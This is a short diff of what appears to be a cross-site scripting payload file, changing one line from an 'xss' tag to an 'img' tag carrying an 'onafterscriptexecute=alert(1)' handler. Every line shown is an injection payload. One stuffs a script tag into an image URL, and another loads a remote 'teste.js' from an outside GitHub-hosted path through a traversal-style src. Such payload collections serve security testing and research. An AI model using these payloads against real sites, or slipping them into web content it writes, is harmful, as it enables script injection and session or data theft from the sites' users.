@@ -2,4 +2,4 @@
 
 <img src="?w=<script>alert(0);</script>" value=”"<script src='../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js'>;"” width="alert(1)">
 
-<xss onafterscriptexecute=alert(1)><script>1</script>
+<img src='' onafterscriptexecute=alert(1)><script>1</script>
